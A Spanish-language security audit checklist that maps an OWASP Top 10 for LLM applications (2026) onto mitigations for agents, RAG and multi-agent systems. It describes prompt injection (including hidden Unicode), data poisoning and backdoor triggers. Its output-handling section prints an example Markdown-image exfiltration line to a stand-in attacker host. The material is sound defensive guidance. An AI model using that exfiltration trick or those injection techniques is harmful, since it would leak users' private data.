# Referencia: OWASP Top 10 para Aplicaciones LLM 2026 (Checklist de Auditoría)

Usa esta referencia durante el **Modo 1 (Modelado de Amenazas Pre-Código)** y el **Modo 3 (Auditoría LLM, Agentes y RAG)**.

> **Principio Central:** Los LLMs procesan instrucciones y datos en un único flujo de tokens sin frontera arquitectónica de confianza. Diseña siempre para **contener el radio de impacto**, asumiendo que el modelo eventualmente será engañado.

---

## Compuerta de la Tríada Letal (Verificación Previa Obligatoria)

Antes de aprobar cualquier función con LLM o agente, comprueba si coinciden simultáneamente:
1. **(A) Entrada No Confiable:** Prompts de usuarios, PDFs subidos, páginas web, correos, documentos RAG, tickets de soporte, issues de GitHub o respuestas de servidores MCP.
2. **(B) Acceso a Datos Privados:** Bases de datos internas, registros de clientes, repositorios privados, PII o credenciales.
3. **(C) Comunicación Externa / Cambio de Estado:** Envío de correos/webhooks, carga de URLs en imágenes Markdown, escritura/borrado en DB, ejecución de shell/código o mutación de sistemas externos.

- **Regla (Regla de Dos de Meta):** Nunca permitas **(A) + (B) + (C)** de forma autónoma. Elimina al menos una pata, O exige confirmación determinista **Human-in-the-Loop (HITL)** fuera del modelo mostrando los parámetros exactos antes de ejecutar la acción.

---

## LLM01 — Inyección de Prompt (Directa, Indirecta y Multimodal)
- [ ] **Filtrado en Todas las Modalidades:** Eliminar caracteres Unicode invisibles (ancho cero `\u200B-\u200D\uFEFF`, bloques de etiquetas `\u{E0000}-\u{E007F}`, selectores de variación) antes de pasar texto al modelo. Ejecutar OCR/transcripción y filtrado en imágenes y audio.
- [ ] **Aislamiento de Contenido Externo:** Envolver fragmentos RAG, salidas MCP y texto de terceros con delimitadores explícitos de contenido no confiable y sanitizar patrones conocidos de inyección.
- [ ] **Cero Confianza Exclusiva en Reglas de Prompt:** Nunca usar `"Nunca reveles datos de clientes"` en el prompt como único control; respaldarlo siempre con límites deterministas en código.

---

## LLM02 — Divulgación de Información Sensible
Auditar las **4 fases del ciclo de vida** (Entrenamiento, Inferencia, Pipeline/Observabilidad, Observación por canales laterales) y **todos los canales de salida** (texto final, argumentos de herramientas, trazas de razonamiento, fragmentos recuperados, logs de telemetría, embeddings):
- [ ] **Minimización de Contexto:** Enviar al modelo solo los campos estrictamente necesarios (nunca volcar registros completos de clientes por defecto).
- [ ] **Autorizar Antes de Recuperar:** Filtrar datos según permisos del usuario/inquilino **antes** de que entren a la ventana de contexto del modelo.
- [ ] **Sanitizar Observabilidad y Trazas:** Limpiar PII, tokens y prompts sensibles antes de enviarlos a telemetría, LangSmith o agregadores de logs.
- [ ] **Limitar Consultas por Usuario:** Aplicar cuotas para frustrar ataques iterativos de extracción/enumeración.

---

## LLM03 — Agencia Excesiva (Riesgo #3 en 2026)
Causas raíz: **Funcionalidad Excesiva**, **Permisos Excesivos** y **Autonomía Excesiva**.
- [ ] **Herramientas Mínimas:** Exponer solo tools específicas con esquemas estrictos de entrada (Pydantic / JSON Schema). Prohibido exponer herramientas abiertas como `run_shell` o `execute_sql`.
- [ ] **Menor Privilegio en Credenciales:** Las herramientas de solo lectura DEBEN usar credenciales de solo lectura (nunca claves `service_role` o admin).
- [ ] **Mediación Determinista Completa:** Las decisiones de autorización se ejecutan en código backend determinista en cada llamada a tool, preservando el contexto del usuario solicitante a lo largo de llamadas encadenadas.
- [ ] **Política Graduada con HITL:** Acciones reversibles de bajo impacto pueden automatizarse; acciones irreversibles o sensibles (pagos externos, borrados, correos externos, escrituras en memoria persistente) requieren confirmación humana explícita.

---

## LLM04 — Cadena de Suministro (Modelos, Adaptadores, Datasets y Paquetes)
- [ ] **Proveedores Verificados y Fijación Inmutable:** Fijar modelos base, adaptadores LoRA, imágenes Docker y paquetes por **hash/digest inmutable** (evitar etiquetas mutables `:latest`).
- [ ] **Protección contra *Slopsquatting*:** Verificar que todo paquete sugerido por un asistente de IA exista legítimamente antes de instalarlo (`uv add` / `npm install`).
- [ ] **Formatos Seguros de Modelo:** Evitar `pickle` u otros formatos que ejecutan código al cargarse; preferir `safetensors` y verificar firmas (p. ej. Sigstore / OpenSSF Model Signing).
- [ ] **AI BOM:** Mantener inventario de modelos, adaptadores, conjuntos de datos y licencias.

---

## LLM05 — Envenenamiento de Datos y Modelos
- [ ] **Linaje y Versionado:** Registrar procedencia de datasets y modelos (**ML-BOM**) y versionarlos (p. ej. DVC) para poder hacer rollback rápido.
- [ ] **Validación Previa a la Ingesta:** Validar documentos y datos buscando anomalías, etiquetas corruptas o instrucciones ocultas antes de indexar en RAG o reentrenar.
- [ ] **Artefactos del Modelo como Código:** Revisar y hashear plantillas de chat, tokenizadores y adaptadores.
- [ ] **Pruebas de Disparadores (*Backdoors*):** Ejecutar suites adversarias tras cada ajuste fino o re-indexación RAG.

---

## LLM06 — Consumo Ilimitado (Riesgo #6 en 2026)
Protege contra *Denegación de Cartera*, bucles de razonamiento, crecimiento cuadrático del historial, costos multimodales, tormentas recursivas de herramientas y extracción de modelo:
- [ ] **Cuotas de Tokens y Límites Rígidos de Gasto:** Medir consumo por usuario/API key y estimar costo antes de invocar al LLM.
- [ ] **Disyuntores de Agentes (*Circuit Breakers*):** Imponer `MAX_PASOS`, profundidad máxima de recursión, tope de iteraciones (ej. ciclos generador-evaluador) y timeouts estrictos.
- [ ] **Control del Crecimiento del Contexto:** Acotar o resumir el historial de conversación para que el turno 100 no cueste 500x el turno 1.
- [ ] **Autenticación y Logprobs:** Autenticar todo endpoint de inferencia y desactivar la exposición de `logprobs` salvo necesidad estricta.

---

## LLM07 — Desinformación (Riesgo #7 en 2026)
Las alucinaciones se vuelven incidentes de seguridad cuando flujos automatizados actúan sobre afirmaciones sin verificar.
- [ ] **Fundamentación (*Grounding*):** Citar fuentes autorizadas o registros de DB; exigir rechazo honesto cuando no haya contexto suficiente (nunca inventar cifras, dotaciones ni SLAs).
- [ ] **Patrón Reclamar → Verificar → Actuar:**
  1. El modelo produce un **Reclamo** estructurado (Pydantic / JSON Schema estricto con `additionalProperties: false`).
  2. El código backend determinista **Verifica** el reclamo contra APIs o estado real de la base de datos.
  3. Solo tras verificar (y con HITL si es de alto impacto) el sistema **Actúa**.
- [ ] **Verificar el Estado Real:** Nunca confiar en un mensaje del agente diciendo que un backup, pago o escritura fue exitoso sin comprobar el estado real del sistema.

---

## LLM08 — Exposición de Contexto Oculto (antes Fuga de Prompt del Sistema)
- [ ] **Asumir Todo Contexto como Público:** Tratar prompts del sistema, instrucciones de desarrollador, esquemas de herramientas y políticas recuperadas como descubribles.
- [ ] **Cero Secretos en Prompts:** Claves API, credenciales DB y tokens viven exclusivamente en servicios backend o tools, nunca dentro de prompts.
- [ ] **Cero Lógica de Autorización en Prompts:** Reglas de permisos (`"solo admins pueden exportar"`) DEBEN vivir en código determinista, no en texto del prompt.

---

## LLM09 — Debilidades de Vectores y Embeddings
Tratar la capa vectorial/embeddings como una **frontera de confianza**:
- [ ] **Pre-Filtrado por Inquilino Dentro de la Consulta Vectorial:** Pasar `tenant_id` / nivel de acceso como filtro obligatorio *dentro* de la búsqueda vectorial (p. ej. `Filter` de Qdrant), **nunca** como post-filtro en Python/JS.
- [ ] **Protección contra Inversión de Embeddings:** Cifrar y proteger la base vectorial y sus backups con la misma confidencialidad que los documentos fuente; borrar los embeddings inmediatamente al eliminar el documento original.
- [ ] **Separación de Índices por Nivel de Confianza:** Separar datos web públicos, documentación interna y archivos de terceros/socios en colecciones distintas para contener el envenenamiento de recuperación.
- [ ] **Prevenir Inferencia de Membresía:** No devolver puntuaciones de similitud crudas ni metadatos internos a clientes no confiables; aplicar *rate limiting* a búsquedas vectoriales.

---

## LLM10 — Manejo Inadecuado de la Salida
Tratar toda salida del LLM como **entrada de usuario no confiable** antes de cualquier sumidero:
- [ ] **Sumideros de Navegador / Markdown:** Escapar HTML (React `{text}`). Deshabilitar o pasar por proxy el renderizado automático de imágenes externas en Markdown dentro de chats (evita exfiltración vía `![x](https://atacante.com/robar?data=...)`).
- [ ] **Sumideros de Base de Datos / Shell / Archivos:** Nunca ejecutar SQL crudo, comandos de shell ni rutas de archivos generados directamente por el modelo sin validación y parametrización.
- [ ] **Validación de Esquema:** Validar salidas estructuradas contra esquemas estrictos antes de procesarlas.
- [ ] **Revisión de Código Generado:** Nunca compilar ni desplegar automáticamente código generado por IA sin revisión humana y pruebas.

---

## Anexo: Verificación Nivel 5 — Ecosistemas Multi-Agente y Producción Crítica

Aplica este anexo junto con el protocolo **Modo 5** cuando el sistema alcance **Nivel 5 de complejidad** (*Swarms*, grafos paralelos, múltiples servicios distribuidos con SLAs estrictos o producción autónoma):

1. **Fronteras de Confianza entre Agentes (*Cross-Agent Zero-Trust*):**
   - [ ] Ningún subagente o *worker* hereda automáticamente credenciales o permisos del coordinador que no necesite para su sub-tarea.
   - [ ] Toda comunicación entre agentes (mensajes en board, *handoffs*, respuestas de subagentes) pasa por esquemas Pydantic/JSON estrictos para evitar propagación lateral de inyección indirecta de prompt.
   - [ ] La memoria compartida/persistente entre hilos o agentes exige validación determinista antes de consolidarse (evita envenenamiento transversal).
2. **Presupuesto Global del DAG (FinOps / SRE):**
   - [ ] Existe un tope global de tokens, coste estimado, profundidad de delegación y tiempo máximo de ejecución para **todo el flujo paralelo/DAG** (no solo por llamada individual).
   - [ ] Los reintentos ante fallo tienen backoff exponencial y límite estricto para evitar tormentas de llamadas entre agentes.
3. **Inyección de Fallos (*Chaos* Ligero) y Concurrencia *Fail-Secure*:**
   - [ ] Se ha probado qué ocurre si Redis, Qdrant, la base de datos o un worker caen/hacen timeout en medio de una ejecución paralela: el sistema debe abortar en modo *fail-secure*, liberar bloqueos y aplicar *rollback* sin filtrar contexto ni aprobar acciones parciales.
4. **Contratos Cross-Service y *Release Readiness Gate*:**
   - [ ] Contratos entre backend, MCP servers y UI validados por pruebas automatizadas antes de liberar a producción, con métricas comparativas y trazas auditables en CI/CD.
